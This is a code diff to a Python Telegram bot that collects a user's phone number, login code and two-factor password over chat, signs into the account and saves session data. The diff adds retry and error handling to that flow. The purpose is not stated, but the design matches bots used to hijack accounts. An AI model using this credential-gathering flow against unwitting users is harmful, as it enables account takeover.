@@ -27,7 +27,9 @@ from telethon.errors import (
     PhoneCodeInvalidError,
     PhoneNumberInvalidError,
     RPCError,
-    FloodWaitError
+    FloodWaitError,
+    PhoneCodeExpiredError,
+    PhoneCodeEmptyError
 )
 
 # ===== FIREBASE IMPORTS =====
@@ -284,6 +286,8 @@ async def callback(event):
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
             
+            two_fa_enabled = False  # Flag for 2FA status
+            
             try:
                 await status.edit("📤 **Sending OTP...**")
                 sent = await client.send_code_request(phone)
@@ -296,16 +300,45 @@ async def callback(event):
                     await client.sign_in(phone, otp, phone_code_hash=sent.phone_code_hash)
                     
                 except SessionPasswordNeededError:
-                    await conv.send_message("🔐 **2FA Password:**")
-                    password = (await conv.get_response()).text
+                    two_fa_enabled = True  # 2FA is enabled
+                    await conv.send_message("🔐 **2FA Password Required!**")
                     
-                    try:
-                        await status.edit("🔓 **Verifying 2FA...**")
-                        await client.sign_in(password=password)
+                    # Try password (max 3 attempts)
+                    password_attempts = 0
+                    max_attempts = 3
+                    password_success = False
+                    
+                    while password_attempts < max_attempts and not password_success:
+                        await conv.send_message(f"🔐 **Enter 2FA Password (Attempt {password_attempts + 1}/{max_attempts}):**")
+                        password = (await conv.get_response()).text
                         
-                    except (PasswordHashInvalidError, RPCError):
-                        await conv.send_message("❌ **Invalid Password!**")
+                        try:
+                            await status.edit("🔓 **Verifying 2FA...**")
+                            await client.sign_in(password=password)
+                            password_success = True
+                            
+                        except PasswordHashInvalidError:
+                            password_attempts += 1
+                            if password_attempts < max_attempts:
+                                await conv.send_message(f"❌ **Wrong Password!** {max_attempts - password_attempts} attempts left.")
+                            else:
+                                await conv.send_message("❌ **Too many wrong attempts! Login failed.**")
+                                await client.disconnect()
+                                await status.delete()
+                                await start(event)
+                                return
+                        except FloodWaitError as e:
+                            await conv.send_message(f"❌ **Flood Wait! Try after {e.seconds} seconds**")
+                            await client.disconnect()
+                            await status.delete()
+                            await start(event)
+                            return
+                    
+                    if not password_success:
+                        await conv.send_message("❌ **Failed to login with 2FA!**")
                         await client.disconnect()
+                        await status.delete()
+                        await start(event)
                         return
                 
                 me = await client.get_me()
@@ -328,15 +361,26 @@ async def callback(event):
                 
                 save_data(DB_FILE, db)
                 
+                # Show 2FA status in success message
+                twofa_status = "✅ Enabled" if two_fa_enabled else "❌ Not Enabled"
+                
                 await conv.send_message(
                     f"✅ **Login Successful!**\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
                     f"👤 **Name:** {me.first_name}\n"
                     f"🆔 **Username:** @{me.username if me.username else 'None'}\n"
-                    f"🔐 **2FA:** {'✅ Enabled' if 'password' in locals() else '❌ Not Enabled'}\n"
+                    f"🔐 **2FA:** {twofa_status}\n"
                     f"━━━━━━━━━━━━━━━━━━━━"
                 )
                 
+            except PhoneCodeInvalidError:
+                await conv.send_message("❌ **Invalid OTP!**")
+            except PhoneCodeExpiredError:
+                await conv.send_message("❌ **OTP Expired! Please try again.**")
+            except PhoneNumberInvalidError:
+                await conv.send_message("❌ **Invalid Phone Number!**")
+            except FloodWaitError as e:
+                await conv.send_message(f"❌ **Flood Wait! Try after {e.seconds} seconds**")
             except Exception as e:
                 await conv.send_message(f"❌ **Error:** {str(e)}")
             finally:
